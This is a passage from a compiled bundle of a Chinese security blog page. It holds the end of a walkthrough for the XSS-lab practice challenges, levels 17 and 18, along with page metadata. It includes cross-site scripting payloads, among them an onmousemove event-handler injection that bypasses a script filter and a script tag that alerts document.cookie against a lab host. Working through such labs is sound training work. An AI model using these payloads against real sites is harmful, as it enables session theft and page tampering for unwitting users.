src="'+U+'" alt="image" loading="lazy">​</p><p>script被过滤、大写转小写、&lt;&gt;被html编码、而鼠标事件、键盘事件没有限制。</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">?arg01</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a&amp;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">arg02\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=666</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> onmousemove</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;alert(1)&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+H+'" alt="image" loading="lazy">​</p><h2 id="level18" tabindex="-1"><a class="header-anchor" href="#level18"><span>level18</span></a></h2><p>和17一样的</p><p>​<img src="'+L+'" alt="image" loading="lazy">​</p>',130)]))}]]),M=JSON.parse('{"path":"/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/XSS-lab.html","title":"XSS-lab","lang":"zh-CN","frontmatter":{"title":"XSS-lab","index":true,"icon":"x","order":3,"isOriginal":true,"date":"2023-02-15T00:00:00.000Z","category":["渗透测试"],"tag":["渗透测试","XSS-lab"],"description":"XSS-lab实验 level1 payload： 解析：观察URL发现是GET传参并写入H2里，所以闭合H2标签写js就可。 level2 观察发现值在value ​image​ payload： 解析：点击输入框后触发事件 level3 查看值在value ​image​ 输入的>被实体化 ​image​ payload： ​image​ leve...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/XSS-lab.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"XSS-lab"}],["meta",{"property":"og:description","content":"XSS-lab实验 level1 payload： 解析：观察URL发现是GET传参并写入H2里，所以闭合H2标签写js就可。 level2 观察发现值在value ​image​ payload： 解析：点击输入框后触发事件 level3 查看值在value ​image​ 输入的>被实体化 ​image​ payload： ​image​ leve..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"XSS-lab"}],["meta",{"property":"article:published_time","content":"2023-02-15T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"XSS-lab\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-02-15T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":2,"title":"level1","slug":"level1","link":"#level1","children":[]},{"level":2,"title":"level2","slug":"level2","link":"#level2","children":[]},{"level":2,"title":"level3","slug":"level3","link":"#level3","children":[]},{"level":2,"title":"level4","slug":"level4","link":"#level4","children":[]},{"level":2,"title":"level5","slug":"level5","link":"#level5","children":[]},{"level":2,"title":"level6","slug":"level6","link":"#level6","children":[]},{"level":2,"title":"level7","slug":"level7","link":"#level7","children":[]},{"level":2,"title":"level8","slug":"level8","link":"#level8","children":[]},{"level":2,"title":"level9","slug":"level9","link":"#level9","children":[]},{"level":2,"title":"level10","slug":"level10","link":"#level10","children":[]},{"level":2,"title":"level11","slug":"level11","link":"#level11","children":[]},{"level":2,"title":"level12","slug":"level12","link":"#level12","children":[]},{"level":2,"title":"level13","slug":"level13","link":"#level13","children":[]},{"level":2,"title":"level16","slug":"level16","link":"#level16","children":[]},{"level":2,"title":"level17","slug":"level17","link":"#level17","children":[]},{"level":2,"title":"level18","slug":"level18","link":"#level18","children":[]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":3.47,"words":1042},"filePathRelative":"perm/漏洞专题/XSS-lab.md","localizedDate":"2023年2月15日","excerpt":"\\n<h2>level1</h2>\\n<p>payload：</p>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" data-title=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">47.113.187.190:50974/level1.php?name</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">=111</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;/h2&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div>","autoDesc":true}')}}]);